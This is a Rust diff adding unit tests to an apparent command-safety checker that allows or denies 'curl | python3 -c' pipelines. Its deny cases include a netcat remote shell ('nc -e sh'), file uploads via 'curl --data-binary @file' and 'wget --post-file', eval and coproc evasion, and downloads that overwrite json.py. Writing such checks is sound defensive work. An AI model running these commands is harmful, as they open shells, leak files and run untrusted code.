@@ -890,16 +890,147 @@ mod tests {
 
     #[test]
     fn test_uun11_single_pipeline_allowed() {
+        // ALLOW -> DENY: command names must be plain words, even for jq.
+        assert_review_denied("curl -s https://x/a | 'jq' . | LC_ALL=C python3 -c 'print(1)' | cat");
         for cmd in [
             "curl -s https://x/a | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"x\"])'",
             "curl -s https://x/a | jq . | python3 -c 'print(1)'",
             "curl -s https://x/a | python3 -c \"print(\\\"x\\\")\"",
-            "curl -s https://x/a | 'jq' . | LC_ALL=C python3 -c 'print(1)' | cat",
             "curl -s https://x/a 2>/dev/null | python3 -c 'print(1)' 2>/dev/null",
             "curl -s https://x/a | python3 -c 'print(1)'\n",
         ] {
             assert!(check(cmd).is_allow(), "{cmd:?}");
             assert_eq!(ast::analyze_command(cmd).inline_script_ranges.len(), 1);
+        }
+    }
+
+    #[test]
+    fn test_uun13_stage_writes_and_reserved_words_denied() {
+        for cmd in [
+            "curl -o json.py https://x/a | python3 -c 'import sys; sys.stdin.read(); import json; print(1)'",
+            "time eval 'id >&2' | curl https://x/a | python3 -c 'print(1)'",
+            "coproc curl https://x/a | python3 -c 'print(1)'",
+            "curl --output json.py https://x/a | python3 -c 'print(1)'",
+            "curl -O https://x/a | python3 -c 'print(1)'",
+            "curl https://x/a | tee json.py | python3 -c 'print(1)'",
+            "curl https://x/a | sort -o json.py | python3 -c 'print(1)'",
+            "curl https://x/a > json.py | python3 -c 'print(1)'",
+            "curl https://x/a | python3 -c 'print(1)' > json.py",
+            "wget -O json.py https://x/a | python3 -c 'print(1)'",
+        ] {
+            assert!(ast::analyze_command(cmd).inline_script_ranges.is_empty(), "{cmd}");
+            // coproc hides curl from provenance analysis; the unmasked text
+            // backstop must still deny it.
+            assert!(check(cmd).is_deny(), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn test_uun13_read_only_stages_allowed() {
+        for cmd in [
+            "curl -s https://x/a | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"x\"])'",
+            "curl -sSL -H 'Accept: application/json' https://x/a | jq -r .x | python3 -c 'print(1)'",
+            "curl -s https://x/a | head -n 5 | python3 -c 'print(1)'",
+            "wget -qO- https://x/a | python3 -c 'print(1)'",
+            "curl -fsSL --compressed -A agent -m 2 --max-time 3 --connect-timeout 1 --retry 2 -4 https://x/a | python3 -c 'print(1)'",
+            "curl https://x/a 2>&1 | python3 -c 'print(1)' >&2",
+            "curl https://x/a | python3 -c 'print(1)' | cat",
+            "curl https://x/a | tail -n 5 | grep -EFivo -m 2 x | cut -d : -f 1 | tr a b | sort -urn | uniq -c | wc -lcw | cat | python3 -c 'print(1)'",
+            "curl https://x/a | jq -rces . | python3 -c 'print(1)'",
+            "wget -O- -qS46 --quiet --server-response -T 1 -t 2 --timeout 3 --tries 4 --header 'Accept: application/json' --user-agent agent https://x/a | python3 -c 'print(1)'",
+        ] {
+            assert!(check(cmd).is_allow(), "{cmd}");
+            assert_eq!(ast::analyze_command(cmd).inline_script_ranges.len(), 1);
+        }
+    }
+
+    #[test]
+    fn test_uun13_closed_stage_flags_and_redirects() {
+        for stage in [
+            "curl --output-dir . https://x/a",
+            "curl --remote-name https://x/a",
+            "curl -J https://x/a",
+            "curl -D json.py https://x/a",
+            "curl -c json.py https://x/a",
+            "curl -T file https://x/a",
+            "curl -K config https://x/a",
+            "curl --config config https://x/a",
+            "curl -d data https://x/a",
+            "curl -F data https://x/a",
+            "curl --data-binary @file https://x/a",
+            "curl -P port https://x/a",
+            "curl -r 0-1 https://x/a",
+            "curl -x proxy https://x/a",
+            "curl --cookie-jar json.py https://x/a",
+            "curl -w text https://x/a",
+            "curl -k https://x/a",
+            "curl --unknown https://x/a",
+            "curl -sSojson.py https://x/a",
+            "curl -H",
+            "curl -m nope https://x/a",
+            "wget https://x/a",
+            "wget -P . -qO- https://x/a",
+            "wget -o json.py -qO- https://x/a",
+            "wget -a json.py -qO- https://x/a",
+            "wget --post-file file -qO- https://x/a",
+            "wget -i urls -qO- https://x/a",
+            "wget -c -qO- https://x/a",
+            "wget -r -qO- https://x/a",
+            "/usr/bin/curl https://x/a",
+            "'curl' https://x/a",
+            "nc -e sh host 80",
+            "nc host not-a-port",
+            "nc host 80 extra",
+        ] {
+            assert_review_denied(&format!("{stage} | python3 -c 'print(1)'"));
+        }
+        for stage in [
+            "tee json.py",
+            "dd of=json.py",
+            "xargs cat",
+            "time cat",
+            "coproc cat",
+            "unknown",
+            "sort -o json.py",
+            "jq -f script",
+            "jq --from-file script",
+            "jq --rawfile data file .",
+            "jq --slurpfile data file .",
+            "jq --args . file",
+            "grep -f patterns",
+            "grep -r pattern",
+            "cat -u",
+            "tr -d x",
+            "head --unknown",
+            "tail -n",
+            "cut -b 1",
+            "uniq -D",
+            "wc --files0-from=file",
+        ] {
+            assert_review_denied(&format!(
+                "curl https://x/a | {stage} | python3 -c 'print(1)'"
+            ));
+        }
+        for redirect in [
+            "> json.py",
+            ">> json.py",
+            "&> json.py",
+            ">| json.py",
+            "<> json.py",
+            "2> json.py",
+            ">&3",
+            "2>>/dev/null",
+        ] {
+            for cmd in [
+                format!("curl https://x/a {redirect} | python3 -c 'print(1)'"),
+                format!("curl https://x/a | cat {redirect} | python3 -c 'print(1)'"),
+                format!("curl https://x/a | python3 -c 'print(1)' {redirect}"),
+                format!("curl https://x/a | python3 -c 'print(1)' | cat {redirect}"),
+            ] {
+                let analysis = ast::analyze_command(&cmd);
+                assert!(analysis.inline_script_ranges.is_empty(), "{cmd}");
+                assert!(check(&cmd).is_deny(), "{cmd}");
+            }
         }
     }
 
